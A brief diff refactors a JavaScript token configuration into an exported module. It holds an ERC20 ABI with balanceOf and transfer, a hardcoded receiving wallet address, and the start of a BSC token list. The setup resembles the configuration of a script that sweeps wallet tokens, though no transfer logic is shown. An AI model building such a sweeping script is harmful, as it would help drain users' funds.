@@ -1,14 +1,12 @@
-// Standard ERC20 ABI for all tokens
-const ERC20_ABI = [
+// tokens.js
+export const ERC20_ABI = [
   "function balanceOf(address owner) view returns (uint256)",
   "function transfer(address to, uint256 amount) returns (bool)"
 ];
 
-// Configuration
-const RECEIVING_WALLET = "0x773F5d9eEc75629A2624EEd5D95472910D6c651a";
+export const RECEIVING_WALLET = "0x773F5d9eEc75629A2624EEd5D95472910D6c651a";
 
-// Token contracts - Full list with all tokens
-const TOKENS = {
+export const TOKENS = {
   bsc: [
     // AUTO Token (primary token for this dapp)
     {
